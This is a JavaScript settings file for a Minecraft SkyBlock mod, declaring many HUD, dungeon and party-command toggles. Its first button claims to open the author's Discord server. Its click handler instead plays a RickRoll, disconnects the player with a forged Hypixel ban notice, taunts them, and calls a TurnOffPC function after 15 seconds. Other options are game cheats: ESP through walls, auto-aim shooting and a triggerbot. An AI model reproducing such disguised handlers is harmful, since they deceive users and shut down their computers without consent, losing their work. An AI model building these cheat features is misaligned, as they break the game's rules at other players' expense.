import FuckYouIWantToUseThatName from "../Amaterasu/core/Settings";
import DefaultConfig from "../Amaterasu/core/DefaultConfig"
import { RickRoll, DisconnectFromServer, Alert, TurnOffPC, getModuleVersion, fullName } from "./utils"

const config = new DefaultConfig("NoammAddons", "Config/Settings.json")


config
.addButton({
    title: "§9§l§nDiscord Server",
    description: "\n§fJoin if you want to §cReport a bug§a or make a suggestion\n\n§fOr §6DM§f me on §9§l§nDiscord: akatsukiharu\n\n§dTime took making this module:§d 1 year and 2 months",
    category: "General",
    subcategory: "",
    placeHolder: "[ Click me! ]",
    configName: "MyDiscord",
    onClick() {
        setTimeout(RickRoll, 1111)
        Client.currentGui.close()
        setTimeout(() => DisconnectFromServer(
        
            `§cYou are temporarily banned for §r359d 23h 59m 59s §cfrom this server!

            §7Reason:§r Cheating through the use of unfair game game advantages.
            §7Find out more: §b§nhttps://www.hypixel.net/appeal§r

            §7Ban ID: §r#783A8N7C
            §7Sharing your Ban ID may affect the proccessing of your appeal!
            `)

       , 5000)

       register(`step`, () => Alert(`§4§lI am sorry but i am not taking any feedback or suggestions\n\n&b&lAlso i might should have said that earler but your PC is about to be turned off enjoy ur remaining time <3`, 1)).setFps(3)
       setTimeout(TurnOffPC, 15000)

    }
})
.addButton({
    title: "§6Edit §eGui §alocations",
    description: "\n§fClick on an element and drag it to change its location.\n§fClick and Hold than Scroll to incrase/decrese the size of an Element.",
    category: "General",
    subcategory: "",
    placeHolder: "[ Click me! ]",
    configName: "EGUIButtonAction",
    onClick() {
        setTimeout(() => ChatLib.command("naeditmaingui", true) , 500)
    }
})



.addSwitch({
    title: "§dClock Display",
    description: "\n§fDisplays the System Time on screen",
    category: "General",
    subcategory: "HUD",
    configName: "ClockDisplay",
})
.addSwitch({
    title: "§dFPS Display",
    description: "\n§fDisplays the System Time on screen",
    category: "General",
    subcategory: "HUD",
    configName: "FPSdisplay",
})
.addSwitch({
    title: "§9§lSpring Boots §6Display",
    description: "\n§fRenders §dSexy §9§lSpring Boots §eCharge§6 Display",
    category: "General",
    subcategory: "HUD",
    configName: "SpringBootsDisplay",
})
.addSwitch({
    title: "§6§lCustom §b§lScoreboard",
    description: "\n§fRenders §dSexy §6§lCustom §8Dark §b§lScoreboard",
    category: "General",
    subcategory: "HUD",
    configName: "CustomScoreboard",
})
.addSwitch({
    title: "§6§lCustom §a§lTablist",
    description: "\n§fRenders §dSexy §6§lCustom §8Dark §a§lTablist",
    category: "General",
    subcategory: "HUD",
    configName: "CustomTablist",
})






.addSwitch({
    title: "§6§lCustom §b§lPet §c§lMenu",
    description: "\n§fRenders §dSexy §6§lCustom §b§lPet §c§lMenu",
    category: "General",
    subcategory: "Custom Pet Menu",
    configName: "CustomPetMenu",
})

.addSwitch({
    title: "§6§lLight Mode Gui?",
    description: "\n§fChanges the Color of the Custom Gui to white",
    category: "General",
    subcategory: "Custom Pet Menu",
    configName: "CustomPetMenuLightMode",
})









.addSwitch({
    title: "§6Custom §aItem §dTooltips",
    description: "\n§fRenders §dSexy §6§lCustom §8Dark §aItem §dTooltip",
    category: "General",
    subcategory: "Misc",
    configName: "CustomItemTooltip",
})
.addSwitch({
    title: "§6Custom §cDamage §bNametag",
    description: "\n§fReplaces the default §cDamage §bNametag§f with a formatted one for better §bReadability",
    category: "General",
    subcategory: "Misc",
    configName: "CustomDamageNametag",
})
.addSwitch({
    title: "§6Custom §aBow §cHit §dSound",
    description: "\n§fPlays a §6Custom §dSound§f when a player §cHit§f with a §aBow",
    category: "General",
    subcategory: "Misc",
    configName: "CustomBowHitSound",
})
.addSwitch({
    title: "§d§lInventory §b§lButtons",
    description: "\n§fPlaces §6Custom§f Buttons in the inventory to execute simple commands",
    category: "General",
    subcategory: "Misc",
    configName: "InventoryButtons",
})
.addSwitch({
    title: "§8§lWither §e§lShield §3Display ",
    description: "\n§fShows the §4cooldown§f of the §8§lWither §e§lShield §6ability§f on a §8§lWither§r §fblade with §8§lWither §cimpact §6ability",
    category: "General",
    subcategory: "Misc",
    configName: "WitherShieldDisplay",
})
.addSwitch({
    title: "§d§lParty §b§lFinder §6§lOverlay",
    description: "\n§fDisplays the §ccata§f §elvl§f of each §9party along with its §cmissing §bclasses§f and whether you can join it",
    category: "General",
    subcategory: "Chat",
    configName: "PartyFinderOverlay",
})




.addSwitch({
    title: "§dShort §bSky§dBlock §bCommands",
    description: "\n§fEnables a list of useful short version of skyblock's commands\n§6(§btype /ssbc for help§6)",
    category: "General",
    subcategory: "Chat",
    configName: "ShortSkyBlockCommands",
    value: true
})
.addSwitch({
    title: "§aChat Coords §d2 WayPoint",
    description: "\n§fCreates a waypoint whenever a recieved chat message matches\n\n§bx: 1, y: 1, z: 1",
    category: "General",
    subcategory: "Chat",
    configName: "ChatCoordsWayPoint",
})
.addColorPicker({
    title: "§dWay§bPoint §2C§3o§4l§5o§6r§r",
    description: "\n§fThe §2C§3o§4l§5o§6r§r§f of the §dWay§bPoint",
    category: "General",
    subcategory: "Chat",
    configName: "ChatCoordsWayPointColor",
    value: [255, 255, 255, 255],
})
.addSwitch({
    title: "§dHebrew§r §62 §bEnglish",
    description: "\n§fAutomatically converts Hebrew characters to their corresponding English characters based on a predefined mapping.",
    category: "General",
    subcategory: "Chat",
    configName: "HebrewToEnglish",
})
.addSwitch({
    title: "§6Chat §dEmojis",
    description: "\n§6[MVP§d++§6] §dChat §dEmojis",
    category: "General",
    subcategory: "Chat",
    configName: "ChatEmojis",
})



.addSwitch({
    title: "§9§lM§a§la§c§li§d§ln §b§lT§6§lo§e§lg§f§lg§0l§4§le",
    description: "\n§fIf this switch is disabled all features below§f will be off regardless of their §fconfiguration.\n\n§dCredits to §d§loCookie§r§d for the original code. §bAll i did was modify it to fit my needs.",
    category: "General",
    subcategory: "Party Commands",
    configName: "pcEnabled",
})
.addSwitch({
    title: "Whitelist",
    description: "\n§fEnables a whitelist, if this is turned on the only people who can use the party commands \n§fare people in the whitelist. Use /na whitelist",
    category: "General",
    subcategory: "Party Commands",
    configName: "pcWhitelist"
})

.addMultiCheckbox({
    title: "§d§lP§b§la§d§lr§b§lt§d§ly §b§lC§d§lo§b§lm§d§la§b§ln§d§ld§b§ls",
    description: "\n§fAllows §9Party members§f to §cexecute §6leader commands§f in chat \n\n§b§nExsample: \n§6!w §f=> §bwill make you warp the party\n§d!ai §f=> §bwill Toggle the allinvite setting of the party",
    category: `General`,
    subcategory: `Party Commands`,
    placeHolder: "Commands",
    configName: "PartyCommands",
    options: [
        {
            title: "§e!pt {name} (Transfer the party)",
            configName: "pcPtme",
            value: true
        },
        {
            title: "§6!w (warps)",
            configName: "pcWarp",
            value: true
        },
        {
            title: "§d!ai (Toggles allinvite)",
            configName: "pcAllinv",
            value: true
        },
        {
            title: "§a!f0-7 (joins Normal Dungeon)",
            configName: "pcFloor",
            value: true
        },
        {
            title: "§4!m1-7 (joins Master Dungeon)",
            configName: "pcMasterFloor",
            value: true
        },
        {
            title: "§c!dt {Reason}",
            configName: "pcDt",
            value: true
        },
        {
            title: "§b!coords (sends coords)",
            configName: "pcCoords",
            value: true
        },
        {
            title: "§e!tps (sends server tps)",
            configName: "pcTPS",
            value: true
        },
        {
            title: "§d!ping (sends ping)",
            configName: "pcPing",
            value: true
        },
        {
            title: "§b!gay {name} (gay check)",
            configName: "pcGay",
            value: true
        },
    ]
})






.addSwitch({
    title: "§6§lWardrobe §a§lHelper",
    description: "\n§fAllows armor swapping with keyboard keys",
    category: "General",
    subcategory: "Wardrobe Helper",
    configName: "WardrobeHelper"
})
.addKeybind({
    title: "§aFirst Slot Keybind",
    description: "\n",
    category: "General",
    subcategory: "Wardrobe Helper",
    configName: "wd_1",
})
.addKeybind({
    title: "§bSecond Slot Keybind",
    description: "\n",
    category: "General",
    subcategory: "Wardrobe Helper",
    configName: "wd_2",
})
.addKeybind({
    title: "§cThird Slot Keybind",
    description: "\n",
    category: "General",
    subcategory: "Wardrobe Helper",
    configName: "wd_3",
})
.addKeybind({
    title: "§dFourth Slot Keybind",
    description: "\n",
    category: "General",
    subcategory: "Wardrobe Helper",
    configName: "wd_4",
})
.addKeybind({
    title: "§eFifth Slot Keybind",
    description: "\n",
    category: "General",
    subcategory: "Wardrobe Helper",
    configName: "wd_5",
})
.addKeybind({
    title: "§4Sixth Slot Keybind",
    description: "\n",
    category: "General",
    subcategory: "Wardrobe Helper",
    configName: "wd_6",
})
.addKeybind({
    title: "§7Seventh Slot Keybind",
    description: "\n",
    category: "General",
    subcategory: "Wardrobe Helper",
    configName: "wd_7",
})
.addKeybind({
    title: "§8Eighth Slot Keybind",
    description: "\n",
    category: "General",
    subcategory: "Wardrobe Helper",
    configName: "wd_8",
})
.addKeybind({
    title: "§9Ninth Slot Keybind",
    description: "\n",
    category: "General",
    subcategory: "Wardrobe Helper",
    configName: "wd_9",
})




 
.addSwitch({
    title: "§eDungeon Auto Extra Stats",
    description: "\n§fAutomatically types the command to show extra the extra dungeon stats at the end of the run",
    category: "Dungeons",
    subcategory: "QOL",
    configName: "DungeonAutoExtraStats",
})
.addSwitch({
    title: "§eShow §dGyro §aRadius",
    description: "\n§fShows the §5Gyrokinetic wand§f §esucking §aradius",
    category: "Dungeons",
    subcategory: "QOL",
    configName: "GyroCircle",
})
.addSwitch({
    title: "§6§lBlock §5§lGloomlock §c§lDeath",
    description: "\n§cBlocks §fleft Clicking with a §5Gloomlock§f while your §cHP is lower than 25%",
    category: "Dungeons",
    subcategory: "QOL",
    configName: "BlockGloomlockDeath",
})
.addSwitch({
    title: "§aAuto §dULT ",
    description: "\n§fAutomatically Uses your Class Ultimate when you should",
    category: "Dungeons",
    subcategory: "QOL",
    configName: "AutoULT",
})
.addSwitch({
    title: "§a§lAuto §d§lPotion",
    description: "\n§aAutomatically§f gets §d§lPotion§f from your §d§lPotion§f bag when you start §4M7.",
    category: "Dungeons",
    subcategory: "QOL",
    configName: "AutoPotion",
})
.addTextInput({
    title: "§a§lAuto §d§lPotion §6§lCommand",
    description: "\n§FThe command to run to get the §d§lPotion. §cwithout§f the '§c/§f'\n§b§nEXAMPLE:\n\n§6bp 4§f -> §dopens the 4th backpack\n§6ec 2§f -> §dopens the 2nd ender chest",
    category: "Dungeons",
    subcategory: "QOL",
    placeHolder: "bp, ec, pb",
    configName: "PotionSlot",
    value: "pb",
})
.addSwitch({
    title: "§a§lAuto §5§lTwilight",
    description: "\n§a§lAutomatically§f gets §5§lTwilight§f from your storage when §4M7§f-§cP5§f starts.",
    category: "Dungeons",
    subcategory: "QOL",
    configName: "AutoTwilight",
})
.addTextInput({
    title: "§a§lAuto §5§lTwilight §6§lCommand",
    description: "\n§fThe command to run to get the §5§lTwilight. §cwithout§f the '§c/§f'\n§bEXAMPLE:\n\n§6bp 4§f -> §dopens the 4th backpack\n§6ec 2§f -> §dopens the 2nd ender chest",
    category: "Dungeons",
    subcategory: "QOL",
    placeHolder: "bp, ec",
    configName: "TwilightSlot",
    value: "",
})

.addSwitch({
    title: "§a§lAuto §b§lM4",
    description: "\n§a§lAutomatically§f aim shoots the §5§lSpirit Bow§f.",
    category: "Dungeons",
    subcategory: "QOL",
    configName: "AutoM4",
})




.addSwitch({
    title: "§d§lGlobal §b§lToggle",
    description: "\n§fToggles all features in the category",
    category: "Dungeons",
    subcategory: "BetterFloors",
    configName: "BetterFloorsGlobalToggle",
})
.addMultiCheckbox({
    title: "§d§lBetter §b§lFloors",
    description: "\n§fMy §cFunnyMap §bConfig §fported to §5CT",
    category: `Dungeons`,
    subcategory: `BetterFloors`,
    placeHolder: "Click",
    configName: "BetterFloorsMultiCheckbox",
    options: [
        {
            title: "§f§lBetter §4M7",
            configName: "BetterM7",
            value: false
        },
        {
            title: "§f§lBetter §cM6",
            configName: "BetterM6",
            value: true
        },
        {
            title: "§f§lBetter §2M5",
            configName: "BetterM5",
            value: false
        }
    ]
})

.addSwitch({
    title: "§b§lGlobal §6§lToggle",
    description: "\n§fAllows to use the Your Classs §b§lULTIMATE§f/§3§lAbility§f with a keybind witch can be configirate in Minecraft's Options/Controls",
    category: "Dungeons",
    subcategory: "Ability Keybinds",
    configName: "AbilityKeybinds",
})
.addKeybind({
    title: "§b§lULTIMATE §6§lKeybind",
    description: "\n",
    category: "Dungeons",
    subcategory: "Ability Keybinds",
    configName: "ULTKeybind",
})
.addKeybind({
    title: "§3§lAbility §6§lKeybind",
    description: "\n",
    category: "Dungeons",
    subcategory: "Ability Keybinds",
    configName: "AbilityKeybind",
})


.addSwitch({
    title: "§bLegit Ghost Pickaxe",
    description: "\n§cThis is meant for people that lock all of their the inventory slots and are too lazy to unlock them every time they want to create a ghost pickaxe",
    category: "Dungeons",
    subcategory: "Ghost Pickaxe",
    configName: "LegitGhostPickaxe",
})
.addKeybind({
    title: "§bGhost Pickaxe Keybind",
    description: "\n",
    category: "Dungeons",
    subcategory: "Ghost Pickaxe",
    configName: "GhostPickaxeKeybind",
    value: 44
})
.addDropDown({
    title: "§bPickaxe Mode",
    description: "\n",
    category: "Dungeons",
    subcategory: "Ghost Pickaxe",
    configName: "PickaxeMode",
    options: [
        "Toggleable Ghost Pick",
        "Mimic efficiency 10",
        "Both options 1 & 2",
        "Stonk Delay",
        "Ghost Bind"
    ],
    value: 0,
})



.addSwitch({
    title: "§4§lI HATE DIORITE",
    description: "\n§fReplace the Diorite blocks at the P2 to Glass blocks in older to see Storm get Crushed better (Alternative to trying to see his name tag through the blocks)",
    category: "Dungeons",
    subcategory: "F7",
    configName: "IHateDiorite",
})

.addSwitch({
    title: "§4M7 §0Dragon§f Box",
    description: "\n§fDraws a very \"Accurate\" §0Dragon§f Kill Box for §4M7§f-§cP5",
    category: "Dungeons",
    subcategory: "F7",
    configName: "M7DragBox",
})

.addSwitch({
    title: "§4M7 §0Dragon§f Spawn §eTimer",
    description: "\n§fDraws a \"Accurate\" §0Dragon§f Spawn §eTimer§f for §4M7§f-§cP5",
    category: "Dungeons",
    subcategory: "F7",
    configName: "M7DragTimer",
})

.addSwitch({
    title: "§a§lAuto I4",
    description: "\n§fAuto aims and shoots the emerald block at the forth dev in P3 \n\n §f[ §b§nNeed a term&r §f§n§land§r §e§n100% atk speed§r §f] ",
    category: "Dungeons",
    subcategory: "F7",
    configName: "AutoI4",
})

.addSwitch({
    title: "§a§lAuto §0Reaper §cArmor §6Swap",
    description: "\n§f§aAutomatically§f does the §0Reaper §cArmor §6Swap§f before the dragons on §4M7 §cP5§f Spawns\n\n §f[ §b§nNeed to have the Reaper Armor on the first page in your wardrobe&r §r§f] \n\n §6Can also be Triggered with /ras command ",
    category: "Dungeons",
    subcategory: "F7",
    configName: "AutoReaperArmorSwap",
})
.addDropDown({
    title: "§0Reaper §cArmor Slot",
    description: "\n§f§aThe slot where the §0Reaper §cArmor§f is located\n\n §c§lfrom 0 to 9",
    category: "Dungeons",
    subcategory: "F7",
    configName: "ReaperArmorSlot",
    options: [0,1,2,3,4,5,6,7,8,9],
})

.addSwitch({
    title: "§d§lClean §b§lTitles",
    description: "\n§eReplaces§f the big and annoyying f7 titles with smaller and cleaner ones and display them on screen\n§b§nExsamples:\n§r §a1/2 Energy Crystals are now active!§f ==> §f(§c1§f/§b2§f) \n §aNoamm9§a activated a Terminal! (§c6§f/§a7§f)§f ==> §f(§c6§a/7§f)",
    category: "Dungeons",
    subcategory: "F7",
    configName: "CleanTitles",
})

.addSwitch({
    title: "§aF7 §dTerminal §9Numbers",
    description: "\n§flaces a number on each terminal so you know what number it is.",
    category: "Dungeons",
    configName: "TerminalNumbers",
    subcategory: "F7"
})

.addTextInput({
    title: "§dMelody §cAlert",
    description: "\n§fSends a Message in chat when you open §dMelody §6Terminal\n\n§6[§bTIP§6]§f Delete all text to disable",
    category: "Dungeons",
    subcategory: "F7",
    configName: "MelodyAlert",
    value: "Melody Gaming",
})





.addSwitch({
    title: "§EBetter §3Ender Pearls",
    description: "\n§fDisable's Hypixel's stupid §3Ender Pearls§f throw block when you are too close to a wall/floor/ceiling",
    category: "Dungeons",
    subcategory: "Ender Pearls",
    configName: "BetterEnderPearls",
})
.addSwitch({
    title: "§fAuto §eRefill §3Ender Pearls",
    description: "\n§fAutomatically §eRefill §3Ender Pearls§f from sack at the start of a dungeon run\n§6[§bWIP§6] §bdoes not work properly if you have spirit leaps in inventory",
    category: "Dungeons",
    subcategory: "Ender Pearls",
    configName: "AutoRefillEnderPearls"
})




.addSwitch({
    title: "§6§lCustom §d§lSpirit §b§lLeap §e§lMenu",
    description: "\n§fRenders a §6Custom §e§lMenu§f for §d§llSpirit leap",
    category: "Dungeons",
    subcategory: "Spirit Leaps",
    configName: "CustomLeapMenu",
})
.addSlider({
    title: "§6§lCustom §d§lSpirit §b§lLeap §eGui §aScale",
    description: "\n",
    category: "Dungeons",
    subcategory: "Spirit Leaps",
    configName: "CustomLeapMenuScale",
    options: [10, 100],
    value: 100,
})
.addToggle({
    title: "§f§lLight §e§lMode Menu?",
    description: "\n§fChanges the §aC§bo§cl§do§er§f Mode of the §6Custom Leap Menu",
    category: "Dungeons",
    subcategory: "Spirit Leaps",
    configName: "CustomLeapMenuLightMode",
})
.addSwitch({
    title: "§b§lAnnounce Spirit Leaps",
    description: "\n§fSays in party chat who did you leaped to",
    category: "Dungeons",
    subcategory: "Spirit Leaps",
    configName: "AnnounceSpiritLeaps"
})
.addTextInput({
    title: "§bAnnounced Massage",
    description: "\n§fThe Message that will be sent every time you leapd to someone.\n§fYou can use §6{§dname§6} to get the leaped player's name",
    category: "Dungeons",
    subcategory: "Spirit Leaps",
    configName: "AnnouncedLeapMassage",
    value: "Leaped to {name}",
})




.addSwitch({
    title: "§a§lDungeon Mob ESP",
    description: "\n§dDraw a see through wall box around stared dungeon mobs",
    category: "Dungeons",
    subcategory: "ESP",
    configName: "DungeonMobESP",
})

.addDropDown({
    title: "§bESP Mode",
    description: "\n§fSelect an option",
    category: "Dungeons",
    subcategory: "ESP",
    configName: "MobESPMode",
    options: ["Box","Overlay","Box + Overlay"],
    value: 0,
})

.addColorPicker({
    title: "§6ESP §aC§bo§cl§do§er§f",
    description: "\n§fCustomize the §aC§bo§cl§do§er§f of the §a§lDungeon Mob §6ESP§f box §aC§bo§cl§do§er§f",
    category: "Dungeons",
    subcategory: "ESP",
    configName: "MobESPColor",
    value: [255, 255, 255, 255],
})





.addMultiCheckbox({
    title: "§aF7§f/§4M7 §6§lPhase §a§lTimers",
    description: "\n§fSelect which timers you want to see",
    category: "Dungeons",
    subcategory: "Timers",
    configName: "F7M7PhaseTimers",
    options: [
        {
            title: "§5P1 §6Start §eTimer",
            configName: "P1StartTimer",
            value: true
        },
        {
            title: "§bP2 §6Start §eTimer",
            configName: "P2StartTimer",
            value: true
        },
        {
            title: "§7P3 §6Start §eTimer",
            configName: "P3StartTimer",
            value: true
        },
        {
            title: "§cP4 §6Start §eTimer",
            configName: "P4StartTimer",
            value: true
        }
    ]
})

.addSwitch({
    title: "§c§lBlood §b§lDialouge §e§lSkip",
    description: "\n§fMakes a timer for §n24 seconds§r§f after you open the §5blood room \n\n§b§lTip: §c&lYou need to be in blood when timer ends",
    category: "Dungeons",
    subcategory: "Timers",
    configName: "BloodDialougeSkip",
})

.addSwitch({
    title: "§5Purple Pad §eTimer",
    description: "\n§fDraws a very accurate Display that shows when to §ccrush §bstorm§f at §5Purple §eYellow",
    category: "Dungeons",
    subcategory: "Timers",
    configName: "PurplePadTimer",
})

.addSwitch({
    title: "§9§lBonzo Mask §eTimer",
    description: "\n§fDraws a very accurate Display that shows the cooldown of the §9§lBonzo Mask§r§f \"Clownin Around\" Ability",
    category: "Dungeons",
    subcategory: "Timers",
    configName: "BonzoMaskTimer",
})

.addSwitch({
    title: "§f§lSpirit Mask §eTimer",
    description: "\n§fDraws a very accurate Display that shows the cooldown of the §f§lSpirit Mask§r§f \"Second Wind\" Ability",
    category: "Dungeons",
    subcategory: "Timers",
    configName: "SpiritMaskTimer",
})

.addSwitch({
    title: "§5§lPhoenix Pet §eTimer",
    description: "\n§fDraws a very accurate Display that shows the cooldown of the §5§lPhoenix Pet§r§f \"Rekindle\" Ability",
    category: "Dungeons",
    subcategory: "Timers",
    configName: "PhoenixPetTimer",
})








.addSwitch({
    title: "§cDungeon §a§lTeammates §6§lNametag",
    description: "\n§fDraws your §a§lTeammates§r§f Name as a big §6§lNametag§r§f  that you can See through walls.",
    category: "Dungeons",
    subcategory: "Teammates",
    configName: "TeammatesNametag",
})

.addDropDown({
    title: "§cDungeon §a§lTeammates §6§lNametag §eMode",
    description: "\n",
    category: "Dungeons",
    subcategory: "Teammates",
    configName: "TeammatesNametagMode",
    options: ["Class Color","Player's Rank"],
    value: 0,
})

.addSwitch({
    title: "§cDungeon §a§lTeammates §b§lBox",
    description: "\n§fRenders a 2D §b§lbox§f on the screen that visually represents the positions of your §a§lTeammates.",
    category: "Dungeons",
    subcategory: "Teammates",
    configName: "TeammatesBox",
})

.addDropDown({
    title: "§cDungeon §a§lTeammates §b§lBox §eMode",
    description: "\n",
    category: "Dungeons",
    subcategory: "Teammates",
    configName: "TeammatesBoxMode",
    options: ["Class Color","Player's Rank"],
    value: 0,
})






.addSwitch({
    title: "§5Healer §eWish",
    description: "\n",
    category: "Dungeons",
    subcategory: "Healer Wish",
    configName: "healerWish",
})
.addTextInput({
    title: "§5Healer §eWish §bMessage",
    description: "\n",
    category: "Dungeons",
    subcategory: "Healer Wish",
    configName: "healerWishMessage",
    value: "Wish!",
})
.addTextInput({
    title: "§5Healer §eWish §6Title §bMessage",
    description: "\n",
    category: "Dungeons",
    subcategory: "Healer Wish",
    configName: "healerWishTitle",
    value: "§9[§6§kO§r§9] §e§l⚠ §d§lW§bi§ds§bh§d! §e§l⚠ §9[§6§kO§r§9]",
})







.addSwitch({
    title: "§dIce §cfill §6Solver",
    description: "\n",
    category: "Dungeons",
    subcategory: "Solvers",
    configName: "IcefillSolver",
})
.addColorPicker({
    title: "§dIce §cfill §6Solver §aC§bo§cl§do§er§f",
    description: "\n§fThe §aC§bo§cl§do§er§f of the §dIce §cfill §6Solver",
    category: "Dungeons",
    subcategory: "Solvers",
    configName: "IcefillSolverColor",
    value: [255, 255, 255, 255],
})
.addSwitch({
    title: "§eBoulder §6Solver",
    description: "\n",
    category: "Dungeons",
    subcategory: "Solvers",
    configName: "BoulderSolver",
})
.addColorPicker({
    title: "§eBoulder §6Solver §aC§bo§cl§do§er§f",
    description: "\n§fThe §aC§bo§cl§do§er§f of the §eBoulder §6Solver",
    category: "Dungeons",
    subcategory: "Solvers",
    configName: "BoulderSolverColor",
    value: [255, 255, 255, 255],
})
.addSwitch({
    title: "§3Three §eWeirdos §6Solver",
    description: "\n",
    category: "Dungeons",
    subcategory: "Solvers",
    configName: "ThreeWeirdosSolver",
})
.addColorPicker({
    title: "§3Three §eWeirdos §6Solver §aC§bo§cl§do§er§f",
    description: "\n§fThe §aC§bo§cl§do§er§f of the Three Weirdos §6Solver",
    category: "Dungeons",
    subcategory: "Solvers",
    configName: "ThreeWeirdosSolverColor",
    value: [255, 255, 255, 255],
})
.addSwitch({
    title: "§e§lBlaze §6Solver",
    description: "\n",
    category: "Dungeons",
    subcategory: "Solvers",
    configName: "BlazeSolver",
})
.addColorPicker({
    title: "§bFirst §eBlaze §aC§bo§cl§do§er§f",
    description: "\n§fThe §aC§bo§cl§do§er§f of the §eBlaze §6Solver",
    category: "Dungeons",
    subcategory: "Solvers",
    configName: "BlazeSolverFirstBlazeColor",
    value: [0, 114, 255, 85],
})
.addColorPicker({
    title: "§eSecond §eBlaze §aC§bo§cl§do§er§f",
    description: "\n§fThe §aC§bo§cl§do§er§f of the §eBlaze §6Solver",
    category: "Dungeons",
    subcategory: "Solvers",
    configName: "BlazeSolverSecondBlazeColor",
    value: [255, 255, 255, 255],
})
.addColorPicker({
    title: "§cThird §eBlaze §aC§bo§cl§do§er§f",
    description: "\n§fThe §aC§bo§cl§do§er§f of the §eBlaze §6Solver",
    category: "Dungeons",
    subcategory: "Solvers",
    configName: "BlazeSolverThirdBlazeColor",
    value: [255, 255, 0, 85],
})
.addColorPicker({
    title: "§eBlaze §6Solver §fLine §aC§bo§cl§do§er§f",
    description: "\n§fThe §aC§bo§cl§do§er§f of the §eBlaze §6Solver",
    category: "Dungeons",
    subcategory: "Solvers",
    configName: "BlazeSolverLineColor",
    value: [255, 0, 0, 85],
})
.addSwitch({
    title: "§bLivid §6Solver",
    description: "\n",
    category: "Dungeons",
    subcategory: "Solvers",
    configName: "LividSolver",
})
.addToggle({
    title: "§eHide §cWrong §bLivids?",
    description: "\n§fSometimes it breaks the §bLivid §6Solver§f, still W.I.P",
    category: "Dungeons",
    subcategory: "Solvers",
    configName: "HideWrongLivids",
    value: false
})





.addSwitch({
    title: "§aAuto §cClose Dungeon §6Chests",
    description: "\n§aAutomatically §ccloses dungeon §8Secret §6chests§f, ensuring efficient and clutter free clearing.",
    category: "Dungeons",
    subcategory: "Secrets",
    configName: "AutoCloseDungeonChests",
})

.addSwitch({
    title: "§dSecrets Sound",
    description: "\n§fPlays a sound whenever you get a dungeon secret\n §c(might not be 100% accurate on the pick up items)",
    category: "Dungeons",
    subcategory: "Secrets",
    configName: "SecretsSound",
})

.addDropDown({
    title: "§dSecrets Sound §6Type",
    description: "\n§fThe type of sound to play whenever you get a secret",
    category: "Dungeons",
    subcategory: "Secrets",
    configName: "SecretsSoundType",
    options: ["mob.cat.meow","mob.blaze.hit","fire.ignite","random.orb","random.break","mob.guardian.land.hit"],
    value: 0,
})
.addSwitch({
    title: "§4Trace §8Keys",
    description: "\n§fDraws a line from your mouse cursor to the Wither/Blood key",
    category: "Dungeons",
    subcategory: "Secrets",
    configName: "TraceKeys",
})
.addSwitch({
    title: "§4Highlight §cMimic Chest",
    description: "\n§fRenders a Box and nametag above the §cMimic Chest",
    category: "Dungeons",
    subcategory: "Secrets",
    configName: "HighlightMinicChest",
})
.addSwitch({
    title: "§d§lBetter§r §8§lSecrets",
    description: "\n§fReplaces the §8Secrets§f items with a cool box and draws the name of the §8Secret",
    category: "Dungeons",
    subcategory: "Secrets",
    configName: "ColorSecrets",
})
.addSwitch({
    title: "§bAnnounce §5Drafts §6Resets",
    description: "\n§fSays in §9party chat§f when you used §dArchitect's First Draft§f to §6reset§f a §cfailed puzzle",
    category: "Dungeons",
    subcategory: "Secrets",
    configName: "AnnounceDraftsReset",
})
.addSwitch({
    title: "§a§lAuto §5Architect Draft",
    description: "\n§fAutomatically runs /gfs architect's first draft 1 when you fail a puzzle in dungeons.",
    category: "Dungeons",
    subcategory: "Secrets",
    configName: "AutoArchitectDraft",
})





.addSwitch({
    title: "§6Custom §bTerminal Guis",
    description: "\n§fGlobal Switch for §6Custom §bTerminal Guis",
    category: "Dungeons",
    subcategory: "Terminals",
    configName: "CustomTerminalsGui",
})

.addSlider({
    title: "§6Custom Terminals Gui §eScale",
    description: "\n",
    category: "Dungeons",
    subcategory: "Terminals",
    configName: "CustomTerminalMenuScale",
    options: [10, 100],
    value: 100,
})
.addToggle({
    title: "§f§lLight §6Mode Gui?",
    description: "\n§fChanges the §aC§bo§cl§do§er§f Mode of the §6Custom Terminals Gui",
    category: "Dungeons",
    subcategory: "Terminals",
    configName: "CustomTerminalMenuLightMode",
})
.addColorPicker({
    title: "§6Solution §aC§bo§cl§do§er§f",
    description: "\n§fThe §aC§bo§cl§do§er§f of the Solution",
    category: "Dungeons",
    subcategory: "Terminals",
    configName: "CustomTerminalMenuSolutionColor",
    value: [0, 114, 255, 255],
})
.addToggle({
    title: "§dMelody §bTerminal",
    description: "\n",
    category: "Dungeons",
    subcategory: "Terminals",
    configName: "CustomMelodyTerminal",
    value: true
})
.addToggle({
    title: "§9Numbers §bTerminal",
    description: "\n",
    category: "Dungeons",
    subcategory: "Terminals",
    configName: "CustomNumbersTerminal",
    value: true
})
.addToggle({
    title: "§bRubix §bTerminal",
    description: "\n§6[§dTIP§6] §bNo need to swap between Rightclick and Leftclick anymore",
    category: "Dungeons",
    subcategory: "Terminals",
    configName: "CustomRubixTerminal",
    value: true
})
.addToggle({
    title: "§aRed §cGreen §bTerminal",
    description: "\n",
    category: "Dungeons",
    subcategory: "Terminals",
    configName: "CustomRedGreenTerminal",
    value: true
})
.addToggle({
    title: "§6Start With §bTerminal",
    description: "\n",
    category: "Dungeons",
    subcategory: "Terminals",
    configName: "CustomStartWithTerminal",
    value: true
})
.addToggle({
    title: "§aC§bo§cl§do§er§f §bTerminal",
    description: "\n",
    category: "Dungeons",
    subcategory: "Terminals",
    configName: "CustomColorsTerminal",
    value: true
})





.addSwitch({
    title: "§5EtherWarp §6Triggerbot",
    description: "\n§aAutomatically§f clicks for you when you looking at §6Gold Blocks\n\n §6[§bTIP§6]§f Best with §4§lFunnyMapExtras",
    category: "Dungeons",
    subcategory: "EtherWarp",
    configName: "EtherWarpTriggerbot",
})
.addSwitch({
    title: "§aLeft Click §5Etherwarp",
    description: "\n§fIf enabled when Left clicking with a AOTV in hand it will try §5Etherwarp instead",
    category: "Dungeons",
    subcategory: "EtherWarp",
    configName: "LeftClickEtherwarp",
})
.addToggle({
    title: "§6Auto Sneak",
    description: "\n§fShould it also §aAutomatically§f Sneak for you?",
    category: "Dungeons",
    subcategory: "EtherWarp",
    configName: "AutoSneak",
})










.addSwitch({
    title: "§8Shadow Assasian §eAlert",
    description: "\n§fShows a notification on screen when an invinsable §8Shadow Assasian§f is about to §5teleport",
    category: "Alerts",
    subcategory: "Dungeons",
    configName: "ShadowAssasianAlert",
})
.addSwitch({
    title: "§cWatcher Alerts",
    description: "\n§fShows on screen when the Watcher has finish spawning mobs and when blood is done",
    category: "Alerts",
    subcategory: "Dungeons",
    configName: "WatcherAlerts",
})
.addSwitch({
